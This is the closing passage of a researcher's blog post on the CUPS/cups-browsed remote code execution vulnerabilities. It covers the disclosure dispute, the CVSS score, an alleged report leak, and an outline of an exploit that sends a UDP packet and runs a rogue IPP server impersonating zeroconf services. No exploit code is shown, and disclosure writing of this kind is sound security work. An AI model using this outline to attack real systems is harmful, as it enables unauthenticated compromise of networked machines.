<p>To the people that more or less directly questioned my integrity, accused me of spectacularization and of spreading FUD on my socials: I don‚Äôt do this for a living. I don‚Äôt need CVEs to get a job or to prove how good my <em>kung-fu</em> is. Or any attention other than what my projects and research already provide. I don‚Äôt play InfoSec Influencer&trade; like many. To put it like <a target="_blank" rel="noopener" href="https://x.com/JavierGonzalez/status/1838730623982186773">Javier beautifully put it</a>, my mission was to interrupt the triagers focus until they re-prioritized. When I saw that what I thought was pretty serious was being dismissed as an annoyance, I used the only platform I had plus a pinch of drama as a tool to have them fucking re-prioritize. And it worked, wonderfully, more fixes happened after two tweets than with all the arguing and talking, so ü§∑.</p>
<p>Don‚Äôt hate me, hate the system that forced me to do that in order to be taken seriously.</p>
<h3 id="About-the-9-9-CVSS"><a href="#About-the-9-9-CVSS" class="headerlink" title="About the 9.9 CVSS"></a>About the 9.9 CVSS</h3><p>Somebody also accused of making things up, especially due to the 9.9 CVSS severity that I <a target="_blank" rel="noopener" href="https://x.com/evilsocket/status/1838169889330135132">claimed in this tweet</a>. Granted, as <a target="_blank" rel="noopener" href="https://x.com/evilsocket/status/1838220677389656127">I very transparently said in the thread</a>, I‚Äôm really not familiar with CVSS scores, how they are assigned and so on. But here‚Äôs a screenshot from the <a target="_blank" rel="noopener" href="https://www.kb.cert.org/vince">VINCE report</a> of the initial CVSS scores, including the 9.9, being estimated by a RedHat engineer (and also reviewed by another one):</p>
<p><img src="/images/2024/cups1/cvss.png" alt="cvss"></p>
<p>As I said, I‚Äôm not an expert, and I think that the initial 9.9 was mostly due to the fact that the RCE is trivial to exploit and the package presence so widespread. Impact wise I wouldn‚Äôt classify it as a 9.9, but then again, what the hell do I know?</p>
<p>By the way, <strong>CERT‚Äôs VINCE either has a backdoor, or an inside leak, or has zero vetting on who they add to a disclosure</strong>, because <a target="_blank" rel="noopener" href="https://breachforums.st/Thread-Undisclosed-Linux-Unauth-RCE-as-they-claim-Writeup-from-researcher?pid=844608#pid844608">there‚Äôs been a leak</a> of the exact markdown report that I only shared there, including the exploit.</p>
<p><img src="/images/2024/cups1/leak.jpg" alt="leak"></p>
<p>What a fucking circus.</p>
<h2 id="One-More-Thing"><a href="#One-More-Thing" class="headerlink" title="One More Thing"></a>One More Thing</h2><p>When initially I wrote <code>exploit.py</code>, it only sent the UDP packet and created the rogue IPP server. Then with time I started adding features to it, especially zeroconf advertising, and it became a tool. So at some point I decided to rewrite it in Go and integrate this new code in <a target="_blank" rel="noopener" href="https://bettercap.org/">bettercap</a>, giving it the ability to transparently impersonate any service advertised via zeroconf / Bonjour / Avahi on a LAN and doing interesting things with the TXT records and specific service attributes, like IPP. And I discovered other interesting stuff :)</p>
<p>In part II of this series (date TBD since there‚Äôs another disclosure in process), we‚Äôll see how to use these new bettercap modules (not yet released) to attack Apple macOS.</p>
<p>For now, I hope you enjoyed part I, <em>hack the planet!</em></p>

  </div>

  
    <div class="post-tags">
      
        <a href="/tags/linux-security/" class="tag">#linux security</a>
      
        <a href="/tags/exploit/" class="tag">#exploit</a>
      
        <a href="/tags/cve/" class="tag">#cve</a>
      
        <a href="/tags/cups/" class="tag">#cups</a>
      
        <a href="/tags/cups-browsed/" class="tag">#cups-browsed</a>
      
        <a href="/tags/printer/" class="tag">#printer</a>
      
        <a href="/tags/printing/" class="tag">#printing</a>
      
        <a href="/tags/unix/" class="tag">#unix</a>
      
        <a href="/tags/hacking/" class="tag">#hacking</a>
      
        <a href="/tags/rce/" class="tag">#rce</a>
      
        <a href="/tags/disclosure/" class="tag">#disclosure</a>
      
        <a href="/tags/ipp/" class="tag">#ipp</a>
      
        <a href="/tags/zeroconf/" class="tag">#zeroconf</a>
      
        <a href="/tags/udp/" class="tag">#udp</a>
      
        <a href="/tags/responsible-disclosure/" class="tag">#responsible disclosure</a>
      
        <a href="/tags/vulnerability-research/" class="tag">#vulnerability research</a>
      
        <a href="/tags/print-services/" class="tag">#print services</a>
      
        <a href="/tags/unauthenticated-access/" class="tag">#unauthenticated access</a>
      
        <a href="/tags/CVE-2024-47176/" class="tag">#CVE-2024-47176</a>
      
        <a href="/tags/CVE-2024-47076/" class="tag">#CVE-2024-47076</a>
      
        <a href="/tags/CVE-2024-47175/" class="tag">#CVE-2024-47175</a>
      
        <a href="/tags/CVE-2024-47177/" class="tag">#CVE-2024-47177</a>
      
    </div>
  

  <nav class="post-navigation">
    
      <a href="/2025/03/13/How-To-Write-An-Agent/" class="nav-prev">
        <span class="nav-label">PREVIOUS</span>
        <span class="nav-title">How to Write an Agent</span>
      </a>
    
    
      <a href="/2024/09/13/Introducing-bettercap-2-4-0-CAN-bus-hacking-WiFi-bruteforcing-and-builtin-web-UI/" class="nav-next">
        <span class="nav-label">NEXT</span>
        <span class="nav-title">Introducing Bettercap 2.4.0: CAN-Bus Hacking, WiFi Bruteforcing and Builtin Web UI</span>
      </a>
    
  </nav>
</article>


  


<section class="related-posts">
  <h3 class="related-title">YOU MIGHT ALSO LIKE...</h3>
  <div class="cards-grid cards-grid-related">
    
      

<article class="card card-light">
  <a href="/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2025/tapo/header.jpg')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy in the Era of AI Assisted Reverse Engineering</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2022/08/15/Process-behaviour-anomaly-detection-using-eBPF-and-unsupervised-learning-Autoencoders/" class="card-link">
    
      <div class="card-image" style="background-image: url('https://i.imgur.com/QEmpeDl.jpg')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">Process Behaviour Anomaly Detection Using eBPF and Unsupervised-Learning Autoencoders</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2017/08/ble_1.png')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">Hacking a Herb Vaporizer to Set Its Temperature Limit From 190C to 6553.5C Remotely</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-light">
  <a href="/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2017/05/exploit.png')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">TerraMaster NAS TOS &lt;= 3.0.30 Unauthenticated RCE as Root</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
  </div>
</section>




  </main>
  
  <footer class="site-footer">
  <div class="footer-inner">
    <div class="footer-social">
      
        
          
            <a href="https://github.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
            </a>
          
        
          
            <a href="https://twitter.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
          
        
          
            <a href="http://it.linkedin.com/in/simonemargaritelli/" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
          
        
          
        
          
            <a href="mailto:evilsocket@gmail.com" class="social-link" aria-label="Email">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </a>
          
        
      
    </div>
    <p class="footer-copyright">
      &copy; 2026 evilsocket. 
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
    </p>
  </div>
</footer>

  <script src="/a.js"></script>
<script type="text/javascript">
  A['\u0069\u006E\u0069\u0074']({ '\u0061\u0063\u0074\u0069\u006F\u006E': 'none', "statsEndpoint": "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006E\u006F\u0062\u006F\u0074\u002D\u0073\u0074\u0061\u0074\u0073\u002E\u0065\u0076\u0069\u006C\u0073\u006F\u0063\u006B\u0065\u0074\u002E\u0077\u006F\u0072\u006B\u0065\u0072\u0073\u002E\u0064\u0065\u0076\u002F\u006C\u006F\u0067" });
</script>

<!-- Minimal JS - no external dependencies needed -->
<script>
  // Lazy load images
  document.addEventListener('DOMContentLoaded', function () {
    var images = document.querySelectorAll('.card-image[data-bg]');
    images.forEach(function (img) {
      img.style.backgroundImage = 'url(' + img.dataset.bg + ')';
    });
  });
</script>
</body>
</html>
